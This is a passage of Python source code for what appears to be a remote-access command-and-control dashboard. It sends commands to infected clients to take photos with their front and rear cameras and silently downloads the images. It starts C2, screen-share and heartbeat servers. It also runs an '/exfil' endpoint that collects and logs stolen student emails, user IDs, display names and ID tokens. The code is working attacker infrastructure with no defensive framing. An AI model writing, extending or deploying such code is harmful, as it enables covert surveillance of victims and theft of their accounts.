        if response_text.startswith("SNAPSHOT_READY "):
            filepath = response_text.split(" ", 1)[1].strip()
            emit('command_response', {'success': True, 'response': f'Snapshot taken, starting download... ({filepath})', 'client_id': client_id, 'command': command})

            def do_snapshot_download(fp=filepath):
                dl_res = send_command_to_client(client_id, f'download {fp}', save_path=snapshot_save_path(fp))
                socketio.emit('command_response', {**dl_res, 'client_id': client_id, 'command': f'download {fp}'}, namespace='/')

            threading.Thread(target=do_snapshot_download, daemon=True).start()
            return

    elif command == "snapshot_both" and result.get('success'):
        response_text = result.get('response', '')
        if response_text.startswith("SNAPSHOT_BOTH_READY "):
            parts = response_text.split(" ")
            front_path = parts[1] if len(parts) > 1 else None
            rear_path = parts[2] if len(parts) > 2 else None
            emit('command_response', {'success': True, 'response': f'Both snapshots taken, starting downloads...', 'client_id': client_id, 'command': command})

            def do_both_download(fp=front_path, rp=rear_path):
                if fp:
                    dl_front = send_command_to_client(client_id, f'download {fp}', save_path=snapshot_save_path(fp))
                    socketio.emit('command_response', {**dl_front, 'client_id': client_id, 'command': f'download {fp}'}, namespace='/')
                if rp:
                    dl_rear = send_command_to_client(client_id, f'download {rp}', save_path=snapshot_save_path(rp))
                    socketio.emit('command_response', {**dl_rear, 'client_id': client_id, 'command': f'download {rp}'}, namespace='/')

            threading.Thread(target=do_both_download, daemon=True).start()
            return
        elif response_text.startswith("SNAPSHOT_READY "):
            # Only one camera succeeded
            filepath = response_text.split(" ", 1)[1].strip()
            emit('command_response', {'success': True, 'response': f'One camera captured, starting download... ({filepath})', 'client_id': client_id, 'command': command})

            def do_partial_download(fp=filepath):
                dl_res = send_command_to_client(client_id, f'download {fp}', save_path=snapshot_save_path(fp))
                socketio.emit('command_response', {**dl_res, 'client_id': client_id, 'command': f'download {fp}'}, namespace='/')

            threading.Thread(target=do_partial_download, daemon=True).start()
            return

    emit('command_response', {**result, 'client_id': client_id, 'command': command})

@app.route('/api/downloads/<filename>')
@login_required
def download_file(filename):
    """Download a file from the downloads directory"""
    downloads_dir = os.path.join(os.path.dirname(__file__), 'downloads')
    filepath = os.path.join(downloads_dir, filename)
    
    if os.path.exists(filepath):
        return send_file(filepath, as_attachment=True)
    else:
        return jsonify({'error': 'File not found'}), 404

# Start C2 server in background thread
server_thread = C2ServerThread()
server_thread.start()

# Start Screen Share server in background thread
screen_thread = ScreenShareServerThread()
screen_thread.start()

# Start heartbeat thread to monitor client health
heartbeat_thread = HeartbeatThread()
heartbeat_thread.start()

# Log file (appends every payload as JSON line)
LOG_FILE = "exfil_logs.jsonl"

@app.route('/exfil', methods=['POST'])
def receive_exfil():
    try:
        # Get JSON payload
        data = request.get_json(force=True)
        
        if not data:
            return jsonify({"error": "No JSON payload received"}), 400

        # Add timestamp for logging
        received_at = datetime.now().isoformat()
        entry = {
            "received_at": received_at,
            "payload": data
        }

        # Print nicely formatted to console
        print("\n" + "="*60)
        print(f"EXFIL RECEIVED at {received_at}")
        print("="*60)
        print("Student Email     :", data.get("email", "N/A"))
        print("UID               :", data.get("uid", "N/A"))
        print("Display Name      :", data.get("displayName", "N/A"))
        print("ID Token (partial):", (data.get("idToken") or "N/A")[:40] + "...")
        print("Timestamp         :", data.get("timestamp", "N/A"))
        print("Full raw payload  :", json.dumps(data, indent=2))
        print("="*60 + "\n")

        # Append to log file (JSON Lines format)
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            json.dump(entry, f, ensure_ascii=False)
            f.write("\n")

        return jsonify({"status": "received"}), 200

    except Exception as e:
        print(f"Error processing exfil: {e}")
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    web_port = 6002
    print(f"[*] Starting Web Dashboard on http://0.0.0.0:{web_port}")
    socketio.run(app, host='0.0.0.0', port=web_port, debug=False, use_reloader=False)
